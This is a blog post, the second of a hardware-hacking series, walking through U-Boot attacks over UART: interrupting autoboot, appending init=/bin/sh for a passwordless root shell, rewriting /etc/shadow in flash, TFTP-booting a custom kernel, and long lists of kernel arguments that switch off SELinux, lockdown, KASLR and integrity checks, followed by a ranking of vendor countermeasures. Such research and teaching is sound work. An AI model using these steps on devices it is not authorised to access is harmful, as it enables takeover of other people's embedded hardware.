---
title: "UART Attacks Part 2: U-Boot Arg Injection, init=/bin/sh, and the 3-Second Window"
date: "2026-04-21"
description: "Part 2 of the UART attack series. Stopping autoboot, editing the kernel command line, dropping to a root shell without knowing any password, and what the bootloader lets you do that the kernel never would."
tags: ["hardware hacking", "UART", "U-Boot", "bootloader", "series"]
---

*Most embedded Linux devices hand you root in under ten seconds if you can interrupt the bootloader. No exploit. No credentials. Just the kernel command line and a text editor.*

*Part 1 of this series: [Understanding UART and Brute-Forcing the Baud](/blog/uart-attacks-part1-understanding-and-baudrate-bruteforce). You need a working UART shell on the bootloader before anything in this post applies.*

---

### <span style="color: orange;">What U-Boot Is Actually Doing</span>

When the SoC de-asserts reset, the mask ROM runs, then loads the first-stage bootloader, then U-Boot (the second stage). U-Boot's job is to:

1. Bring up DRAM
2. Bring up the serial console
3. Initialize flash (NAND, NOR, eMMC)
4. Read environment variables from flash
5. Run the `bootcmd` variable
6. Load the kernel + dtb + rootfs
7. Jump to the kernel with the `bootargs` command line

Steps 5 and 7 are the exploitation surface. The window is the `Hit any key to stop autoboot` delay, which is typically 1 to 3 seconds but configurable. Press any key in that window and you get a U-Boot prompt:

```
U-Boot> _
```

From here, you are a tiny OS with full flash access and the ability to rewrite the command line that is about to be handed to Linux.

---

### <span style="color: orange;">The 3-Second Window, And How To Widen It</span>

Vendors sometimes shorten the delay to near zero. Quick ways to still hit it:

- **Hold a key down** before powering on, then release and keep pressing.
- **Paste a long string** into the terminal the moment you power on (minicom's macro, screen's `send` command, or just typing into a Python script with `serial.write(b"\r"*200)`).
- **Spam Ctrl-C** from boot (some U-Boot builds exit autoboot on Ctrl-C).
- **Use the hard reset loop**: reset the device and begin sending keys 100 ms before power is applied, so you are already pressing when autoboot starts.

For stubborn targets with a true zero-delay autoboot, Part 4 (fault injection) covers hardware approaches.

If the U-Boot build has `CONFIG_AUTOBOOT_KEYED=y`, you need a specific magic string, and it is compiled in. Dumping the flash and running `strings` against the U-Boot partition reveals it. Common magic strings from consumer gear: `tpl`, `tplink`, `dbg`, `hi3516`, `reset`.

---

### <span style="color: orange;">Reading the Environment</span>

First command every time:

```
U-Boot> printenv
```

You are looking for these variables:

- `bootargs` - kernel command line
- `bootcmd` - what U-Boot runs to actually start Linux
- `baudrate` - useful to know
- `ethaddr`, `ipaddr`, `serverip` - network for TFTP
- `machid` - board identifier

A typical dump from a HiSilicon IP camera:

```
bootargs=mem=128M console=ttyAMA0,115200 root=/dev/mtdblock2 rootfstype=jffs2 mtdparts=hi_sfc:512K(boot),3M(kernel),10M(rootfs),2M(cfg)
bootcmd=sf probe 0; sf read 0x82000000 0x80000 0x300000; bootm 0x82000000
baudrate=115200
```

`console=ttyAMA0,115200` says the kernel will use the same UART. Good. That means Part 3's login prompt is coming to the same wire.

---

### <span style="color: orange;">The Classic: init=/bin/sh</span>

The Linux kernel accepts an `init=` parameter on its command line. Whatever you put there runs as PID 1, as root, with no login, no rc scripts, no password check. Nothing except the rootfs mount.

```
U-Boot> setenv bootargs "${bootargs} init=/bin/sh"
U-Boot> boot
```

Note: `${bootargs}` preserves the existing args. Without that, you will miss the root device, mtdparts, and console settings and the kernel will panic.

What you get:

```
Freeing unused kernel memory: 1024K
[    2.847] Run /bin/sh as init process

sh: can't access tty; job control turned off
/ # _
```

You are now root on the device. Nothing was bypassed cryptographically. The kernel did exactly what you told it to do.

First moves from this shell:

```
/ # mount -o remount,rw /
/ # cat /etc/shadow
/ # mount
/ # cat /proc/cmdline
/ # ls /dev
```

`/dev` on a half-booted system may be sparse. You can still `mknod` what you need, or remount `/proc` and `/sys` yourself.

---

### <span style="color: orange;">Variations When /bin/sh Is Missing Or Hardened</span>

Vendors who have read the first part of the playbook sometimes remove `/bin/sh`, stripping busybox down. Alternatives:

```
init=/bin/busybox sh
init=/sbin/init.sh
init=/usr/bin/sh
init=/bin/ash
rdinit=/bin/sh          # for initramfs rootfs
```

If all shells are gone, you can still escape the init flow by pointing `init=` at any setuid-root binary that lets you exec something:

```
init=/bin/mount
init=/usr/bin/vi
init=/bin/login
```

`/bin/login` is interesting: it runs, asks for creds, and if creds fail it exits and the kernel panics (init died). Not useful by itself. But if `/etc/shadow` is editable from U-Boot (via the `mw` + `sf write` path below), you can pre-seed it.

---

### <span style="color: orange;">Editing Flash Directly From U-Boot</span>

If you cannot use `init=/bin/sh` for some reason (read-only rootfs with mandatory access control, or a custom init binary that ignores the kernel command line), U-Boot itself can modify flash.

Read a sector of rootfs into RAM:

```
U-Boot> sf probe 0
U-Boot> sf read 0x82000000 0x380000 0x100000
```

That reads 1 MiB from offset 0x380000 of SPI flash (the rootfs partition in this example) into RAM at 0x82000000. You can now `md.b 0x82000000 100` to dump it as hex, search for known strings, and edit with `mw.b`.

To persist: erase the sector, write the modified RAM back:

```
U-Boot> sf erase 0x380000 0x100000
U-Boot> sf write 0x82000000 0x380000 0x100000
```

Typical use: locate `/etc/shadow` inside a squashfs or jffs2 image, replace the `root` line's hash with a known one, and flash back. Next boot, you know the root password.

**This is far messier than init=/bin/sh**. Use it when the simpler path is blocked.

---

### <span style="color: orange;">The Extended Boot Args Researchers Actually Use</span>

`init=/bin/sh` is the famous one. It is also the first thing vendors "harden" by stripping `/bin/sh` from the rootfs. The following args cover the actual breadth of what security researchers reach for when the trivial path is blocked. Each is a real-world primitive, and most have appeared in published disclosures or DEF CON talks.

**Shell replacement variants (when /bin/sh is gone):**

```
init=/bin/bash
init=/bin/ash
init=/bin/busybox sh
init=/bin/busybox ash
init=/usr/bin/sh
init=/sbin/init.sh
init=/bin/dash
init=/bin/mksh
rdinit=/bin/sh
rdinit=/init
```

`rdinit=` is specifically for initramfs-based rootfs. Using `init=` when the kernel expects `rdinit=` fails silently.

**Process replacement with anything that can exec:**

```
init=/bin/login
init=/bin/busybox
init=/bin/su
init=/usr/bin/telnetd
init=/usr/sbin/dropbear
init=/sbin/getty
init=/bin/ping
```

`init=/bin/login` launches the login binary as PID 1 which is rarely useful directly, but if the binary was built with debug strings intact it reveals accepted usernames on crash. `init=/sbin/dropbear` with no config falls back to default host keys and default allow-any behavior on some builds.

**Kernel-level control:**

```
single
S
1
emergency
rescue
break=top
break=premount
break=mount
break=bottom
break=init
```

`single` drops to single-user mode. On older inits this is a passwordless root shell. Modern systemd honors a root password for rescue targets; older SysV init does not. The `break=` arguments are Debian/initramfs-tools specific and stop the boot at different phases, each dropping to a busybox shell inside initramfs before the real rootfs takes over. `break=top` is the earliest, executed before any disk is mounted. Researchers love this one because the initramfs is vastly less hardened than the real rootfs.

**Disabling security subsystems:**

```
selinux=0
enforcing=0
apparmor=0
security=none
audit=0
ima_appraise=off
lockdown=none
module.sig_enforce=0
iommu=off
```

`selinux=0` disables SELinux entirely on a kernel that normally enforces it. `ima_appraise=off` disables file integrity checks on IMA-enabled kernels. `lockdown=none` turns off the kernel lockdown LSM which otherwise prevents loading unsigned modules. These only work if the kernel was built to honor them. A kernel compiled with `CONFIG_SECURITY_LOCKDOWN_LSM_EARLY=y` and `CONFIG_LOCK_DOWN_KERNEL_FORCE_CONFIDENTIALITY=y` ignores `lockdown=none`, for example. Always worth trying.

**Memory and debug features (the quiet unlockers):**

```
nokaslr
kaslr_disabled
debug
earlyprintk=serial,115200
loglevel=8
ignore_loglevel
printk.devkmsg=on
no_hash_pointers
slub_debug=FZPU
kmemleak=on
memblock=debug
initcall_debug
```

`nokaslr` turns off kernel address space randomization. Combined with a kernel-mode info leak elsewhere, this converts "need ASLR bypass" to "already bypassed". `no_hash_pointers` replaces `%pK` hashed pointers in dmesg with real addresses, dropping kernel base leak right into the boot log. `initcall_debug` times every initcall and prints return values, exposing the order and presence of vendor-specific security initialization hooks.

**Module loading abuse:**

```
modprobe.blacklist=ehci_hcd
module_blacklist=tpm
module_blacklist=secureboot_verify
```

Vendor kernels sometimes ship a "secureboot_verify" module loaded from initramfs that enforces additional signature checks at runtime. Blacklisting it at the command line disables the check if the kernel loader honors the blacklist for module-init ordering.

**Root device redirection:**

```
root=/dev/ram0
root=/dev/sda1
root=/dev/mmcblk0p5
root=PARTLABEL=rescue
root=UUID=ffffffff-ffff-ffff-ffff-ffffffffffff
rootdelay=30
rootwait
ro
rw
```

Booting with `root=` pointing at your own media (SD card inserted, USB storage if the kernel has gadget support enabled) loads your rootfs instead of the vendor's. `rootdelay=30` gives you 30 seconds to attach media after the kernel asks. `rw` overrides read-only mounts so you can write to the vendor rootfs on first boot.

**Console hijacking:**

```
console=ttyS0,115200
console=ttyUSB0,115200
console=tty0
console=null
quiet
```

Adding `console=ttyUSB0,115200` gets the boot log on your attached USB-serial adapter even if the device normally mutes output. `console=null` paired with a secondary `console=ttyS0,115200` can unmute a vendor's deliberately-silenced UART on some drivers.

**Filesystem and namespace control:**

```
rootflags=data=ordered,errors=continue
rootfstype=ext4
norecover
skip_mount_options
init_on_alloc=0
init_on_free=0
mitigations=off
```

`rootflags=errors=continue` prevents the kernel from panicking on rootfs errors, which is useful after you have deliberately corrupted part of the rootfs to trigger a rescue shell. `mitigations=off` disables all CPU speculative-execution mitigations, significantly changing timing of subsequent probes.

**Container and sandboxing bypasses (on kernels that ship with them):**

```
systemd.unit=rescue.target
systemd.unit=emergency.target
systemd.confirm_spawn=true
systemd.debug_shell=ttyS0
systemd.setenv=SYSTEMD_LOG_LEVEL=debug
```

If the device runs systemd, the `systemd.debug_shell` argument enables a passwordless root shell on the specified tty at boot, independent of any normal login. `systemd.unit=rescue.target` requests rescue mode. Older systemd honors this without password on unpatched embedded builds.

**Android-specific flags (the embedded Android gear is big):**

```
androidboot.mode=factory
androidboot.mode=charger
androidboot.hardware=...
androidboot.selinux=permissive
androidboot.secure=0
androidboot.verifiedbootstate=orange
androidboot.veritymode=disabled
androidboot.vbmeta.digest=0000...
```

`androidboot.selinux=permissive` disables SELinux enforcement on Android, converting "cannot execute" errors into warnings. `androidboot.verifiedbootstate=orange` signals a user-unlocked bootloader. `androidboot.mode=factory` brings up factory diagnostics which on many devices includes an ADB shell with root.

**Vendor-specific unlock flags found in disclosures:**

```
vendor.debug=1
factory_mode=1
u-boot.debug=1
atf.console=1
bsp_debug=1
mtk_debug=1
hi_debug=1
am_factory_mode=1
factory=1
fastboot=1
```

These are not standard kernel args. They are vendor additions parsed by vendor init scripts or by the bootloader itself before jump. Each one was discovered in a specific researcher's writeup: MediaTek's `mtk_debug=1` was public in a 2019 cellular-modem analysis. HiSilicon's `hi_debug=1` showed up in a camera-firmware teardown. `am_factory_mode=1` is an Amlogic vendor flag.

The pattern: grep the device's U-Boot binary, the kernel's `.init.data` section, and every init script on the rootfs for `getenv`, `strstr`, `bootargs`, `/proc/cmdline`. Any string that looks like a flag and is matched against the kernel command line is a candidate for the list.

**Watchdog and panic control (keeping the device alive long enough to exploit):**

```
panic=0
panic=-1
oops=panic
oops=continue
nopanic
watchdog.handle_boot_enabled=0
nowatchdog
```

`panic=-1` causes the kernel to not reboot on panic, instead hanging with all state preserved. Invaluable when a glitch induces a kernel panic and you want to read the panic log and memory dump over UART instead of watching the device auto-reset.

**Combining arguments (the real-world stack):**

A cmdline researchers reach for on a first-access U-Boot shell, maximum leverage:

```
U-Boot> setenv bootargs "${bootargs} init=/bin/sh single rw rootdelay=10 selinux=0 apparmor=0 security=none nokaslr no_hash_pointers ignore_loglevel printk.devkmsg=on panic=-1 loglevel=8 earlyprintk=serial,115200"
```

This gives you: a shell as PID 1, writable rootfs, no MAC, no ASLR, full dmesg output including raw pointers, full early console, and no reboot on panic. If the kernel respects half of these, you are effectively a debugging god on the device.

**How vendors defeat this (the honest list):**

- Signed bootloader with signed kernel image where `bootargs` is part of the signed blob. Any append via U-Boot is rejected at kernel verification.
- Kernel compiled with `CONFIG_CMDLINE_FORCE=y` and a hardcoded command line that ignores bootloader input entirely.
- LSM modules that re-check command line at runtime and panic if they see blacklisted strings. `mitigations=off` detection in custom LSMs is a real thing on hardened industrial builds.
- The init binary itself (if vendor-custom) validates `/proc/cmdline` against a whitelist and reboots on mismatch.

When all four are in place, Part 3's login bypasses and Part 4/5's fault injection are your remaining options.

---

### <span style="color: orange;">Loading Your Own Kernel Over TFTP</span>

If the deployed kernel is too stripped to be useful, load a full one:

```
U-Boot> setenv ipaddr 192.168.1.100
U-Boot> setenv serverip 192.168.1.50
U-Boot> tftpboot 0x82000000 uImage-custom
U-Boot> bootm 0x82000000
```

You now control the kernel. You can skip the device's init entirely and boot a minimal initramfs shell. Useful for forensics on a device whose original rootfs you want to preserve untouched.

Requirement: the U-Boot in flash must have Ethernet support compiled in (`CONFIG_CMD_NET`). Most consumer devices do. Some stripped industrial ones do not.

---

### <span style="color: orange;">The Countermeasures Vendors Use, Ranked By Effectiveness</span>

From least effective to most:

**Shortening autoboot delay to 0.** Defeated by key-spam at power-on. Effort to bypass: zero.

**Requiring a magic key to interrupt (`CONFIG_AUTOBOOT_KEYED`).** Defeated by `strings` on a flash dump. Effort: minutes.

**Disabling the U-Boot command-line entirely (`CONFIG_AUTOBOOT_STOP_STR=""` and no prompt).** Defeated by editing flash via an external programmer and re-enabling. Effort: tens of minutes with a CH341A clip.

**Signed bootloader + signed kernel with no user-controllable bootargs.** This is Secure Boot doing its job. The kernel command line is baked into the signed image. `init=/bin/sh` cannot be appended. See [Secure Boot on ESP32-S3](/blog/secureboot-chain-of-trust-esp32). Effort to bypass: depends on whether the vendor did the whole chain. Usually they did not.

**UART disabled in hardware (eFuse or no pads populated).** Forces Part 4 (fault injection) or Part 5 (EMFI). Effort: hours to days with specialized equipment.

**UART disabled in hardware AND a correctly deployed Secure Boot.** This is the target that actually holds.

The industry average in 2026 on 15 USD devices: "shortening autoboot delay to 0" and calling it done.

---

### <span style="color: orange;">What Part 2 Teaches</span>

Once you are at the U-Boot prompt on a device without Secure Boot, you already won. The command line is user-controlled, and the kernel trusts the command line. There is no amount of rootfs hardening that survives `init=/bin/sh` being appended at the bootloader.

The mitigation is not at the kernel. It is at Secure Boot and at locking the U-Boot environment to a signed, immutable image. Anything short of that is theater.

Part 3 is for the devices where the bootloader is actually locked but you still have a UART-attached login prompt to attack.

---

*Series index:*
*[Part 1: Understanding UART and Baud Brute Force](/blog/uart-attacks-part1-understanding-and-baudrate-bruteforce)*
*Part 3: Login and Password Bypass (next)*
*Part 4: Fault Injection Against UART-Locked Devices*
*Part 5: EMFI to Unlock a Silenced UART*
